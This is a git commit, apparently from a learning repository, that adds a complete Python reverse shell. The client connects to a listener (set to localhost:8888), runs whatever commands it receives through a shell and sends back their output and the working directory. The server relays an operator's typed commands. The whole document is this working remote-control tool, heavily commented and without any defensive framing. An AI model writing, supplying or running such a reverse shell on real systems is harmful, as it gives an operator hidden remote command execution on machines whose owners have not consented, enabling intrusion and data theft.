627ea8da6be2618117a3bc5c8c623d998dadf326
shubham11941140 <63910248+shubham11941140@users.noreply.github.com>
2021-12-13 11:44:14 +0530

    Add files via upload

---
+++ Part 2/Reverse Shell Client Server/reverse_shell_client.py
@@ -0,0 +1,123 @@
+# Import the necessary libraries
+
+from os import chdir
+from os import getcwd
+
+from subprocess import PIPE
+from subprocess import Popen
+
+# Import the necessary functions from the socket library
+from socket import AF_INET
+from socket import error
+from socket import socket
+from socket import SOCK_STREAM
+
+# Uninitialised socket at client
+s = None
+
+# Standard host is initialised
+host = 'localhost'
+
+# Standard port is initialised
+port = 8888
+
+# Create the client socket
+try:
+
+    # Try to create the client socket with any IP address and TCP Stream
+    s = socket(AF_INET, SOCK_STREAM)
+
+# Unable to create client socket
+except error as msg:
+
+    # Print appropriate message to the user
+    print("Socket creation error:", msg)
+
+# Connect the client socket to the server host and port
+try:
+
+    # Try to connect the socket
+    s.connect((host, port))
+
+# Unable to connect client socket
+except error as msg:
+
+    # Print appropriate message to the user
+    print("Socket connection error:", msg)
+
+# The server needs to print the current working directory in the reverse shell
+currentWD = getcwd() + "> "
+
+# The calculated current working direcctory is encoded and sent as a byte stream to the server
+s.send(currentWD.encode())
+
+# We will continue to receive shell commands from the server till the user does not want to exit
+while True:
+
+    # Receive the data from the server and process it as a shell command
+    # Decoding the byte stream as a string to process as a valid command
+    data = s.recv(2048).decode("utf-8")
+
+    # If the command to exit the shell is entered, exit the shell
+    # Exiting the loop will prevent it from taking more commands
+    if data == 'exit':
+
+        # Terminate the loop
+        break
+
+    # Since this is a command to change the directory to a new directory
+    # The path of the shell needs to be changed, it is handled seperately
+    elif data[:2] == 'cd':
+
+        # To store the necessary message for the user
+        output_str = ""
+
+        # Try to change the directory path to the specified directory
+        try:
+
+            # Specified directory path is the string after "cd"
+            # We leave the 1st 2 characters and consider the string after the 3rd character
+            chdir(data[3:])
+
+        # Unable to change the directory path as it does not exist
+        except:
+
+            # The necessary error message for the user
+            output_str = "No such directory available\n"
+
+        # As the working directory has been changed
+        # We need to update the current working directory before sending it to the user
+        currentWD = getcwd() + "> "
+
+        # Send the necessary details to the user
+        # Error messages and changed path must be visible to the user in the reverse shell
+        # String is encoded as a byte stream and sent
+        s.send(str.encode(output_str + currentWD))
+
+    # It is a valid shell command that does not interfere with the directory path
+    # It must be a processed as a proper shell process
+    elif len(data):
+
+        # Create a child process as a new process to the currently running parent process
+        # As we will be using stdin, stdout, sterr and a shell, we need to create a pipe to open a stream for the standard processes
+        # All the arguments use PIPE as the standard streams need to opened
+
+        # As the shell command needs to run as a full process, we create a child process and run it in that process
+        cmd = Popen(data[:], shell = True, stdout = PIPE, stdin = PIPE, stderr = PIPE)
+
+        # The output byte stream must consist of the standard output and standard error of the created child process
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+
+        # As the user will be seeing a string, the byte stream is decodes into a string
+        output_str = output_byte.decode("utf-8")
+
+        # We need to update the current working directory before sending it to the user
+        currentWD = getcwd() + "> "
+
+        # Send the necessary details to the user
+        # Output and Error messages and current path must be visible to the user in the reverse shell
+        # String is encoded as a byte stream and sent
+        s.send(str.encode(output_str + currentWD))
+
+# As the reverse shell has been exited, close the socket connection
+s.close()
---
+++ Part 2/Reverse Shell Client Server/reverse_shell_server.py
@@ -0,0 +1,133 @@
+# Import the necessary libraries
+
+from sys import exit
+
+from time import sleep
+
+# Import the necessary functions from the socket library
+from socket import AF_INET
+from socket import error
+from socket import socket
+from socket import SOCK_STREAM
+from socket import SOL_SOCKET
+from socket import SO_REUSEADDR
+
+# Recursive function to try to bind to the socket
+def bind_socket():
+
+    # As we need to bind the uninitialised socket, calling it
+    global s
+
+    # Try to complete the binding of the socket
+    try:
+
+        # Appropriate message is displayed
+        print("Binding the Port:", port)
+
+        # Bind to the specified host and port
+        s.bind((host, port))
+
+        # Since it is the server socket, it will listen
+        s.listen(5)
+
+    # Socket is unable to bind to the specific socket address
+    except error as msg:
+
+        # We seek to try binding again
+        # Appropriate message is displayed
+        print("Socket Binding error", msg)
+
+        # Seek to retry
+        # Appropriate message is displayed
+        print("Retrying...")
+
+        # Wait for an interval of 5 seconds for the function to end
+        sleep(5)
+
+        # Retry binding by calling the same function recursively
+        bind_socket()
+
+# Host is initialised
+host = ''
+
+# Standard port is initialised
+port = 8888
+
+# Uninitialised socket at server
+s = None
+
+# Create the server socket
+try:
+
+    # Try to create the server socket with any IP address and TCP Stream
+    s = socket(AF_INET, SOCK_STREAM)
+
+# Unable to create server socket
+except error as msg:
+
+    # Appropriate message is displayed
+    print("Socket creation error:", msg)
+
+    # Since we are not able to normally bind to the socket
+    # We will forcibly bind to the socket
+
+    # SOL_SOCKET manipulates the current socket in use
+    # SO_REUSEADDR forcefully attaches to the address of the same socket
+    # 1 is a BOOL value for True which sets the forceful attachment to True
+    s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+
+# Bind the socket to the specified host and port using the above user-defined function
+bind_socket()
+
+# Binding is complete which indicates the server is listening
+# Appropriate message is displayed
+print("Server Listening...")
+
+# Accept the socket connection from the client connection
+conn, address = s.accept()
+
+# Appropriate message is displayed
+print("Connection has been established! |", "IP", address[0], "| Port", address[1])
+
+# The client sends the working directory to print before entering the command
+# It needs to be displayed to the user for him to learn the current working directory
+
+# The received bytes have to be decoded to string
+print(conn.recv(2048).decode("utf-8"), end = "")
+
+# We will continue to take shell commands till we don't exit
+while True:
+
+    # Take the shell command from the user as a string
+    cmd = str(input())
+
+    # If the command to exit the shell is entered, exit the shell
+    if cmd == 'exit':
+
+        # Tell the client to close the connection
+        # Send closing message to the client
+        # We encode to send the string as bytes across the connection
+        conn.send(cmd.encode())
+
+        # Close the connection
+        conn.close()
+
+        # Close the socket
+        s.close()
+
+        # Exit the program
+        exit()
+
+    # If a valid command is entered in the shell other than exit
+    # We need to parse it and send it to the server to execute on the reverse shell
+
+    if len(cmd.encode()):
+
+        # We encode to send the commanded string as bytes across the connection
+        conn.send(cmd.encode())
+
+        # Display the contents of the output of the executed shell command on the screen
+        # As the reverse shell runs on the client it is sent to the server which displays it
+
+        # Decode the reveived bytes to a string to display string output
+        print(conn.recv(2048).decode("utf-8"), end = "")
